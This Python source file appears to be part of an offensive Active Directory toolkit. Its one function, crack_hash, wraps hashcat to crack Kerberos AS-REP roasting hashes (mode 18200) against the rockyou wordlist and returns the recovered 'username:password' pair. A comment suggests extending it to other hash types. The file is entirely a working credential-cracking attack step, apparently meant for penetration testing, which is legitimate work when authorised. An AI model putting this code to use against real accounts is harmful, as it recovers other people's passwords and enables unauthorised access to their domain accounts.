import subprocess
import tempfile
import os

# AS REP ROASTING CRACKING.... IF WE NEED TO CRACK MORE THAN JUST AS-REPS, WE CAN EXPAND THIS FUNCTION TO ACCEPT DIFFERENT HASH TYPES AND MODES
def crack_hash(hash_value, mode="18200", wordlist="/usr/share/wordlists/rockyou.txt"):

    try:
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
            f.write(hash_value + "\n")
            hash_file = f.name

        subprocess.run([
            "hashcat",
            "-m", mode,
            hash_file,
            wordlist,
            "--force"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        cracked = subprocess.run(
            ["hashcat", "-m", mode, hash_file, "--show"],
            capture_output=True,
            text=True
        )

        os.unlink(hash_file)

        output = cracked.stdout.strip()

        if output:
            full_hash, password = output.rsplit(":", 1)

            # extract username from AS-REP hash
            if "$krb5asrep$" in full_hash:
                user_part = full_hash.split("$")[3]
                username = user_part.split("@")[0]
                return f"{username}:{password}"

            return f"{full_hash}:{password}"

        return None

    except Exception:
        return None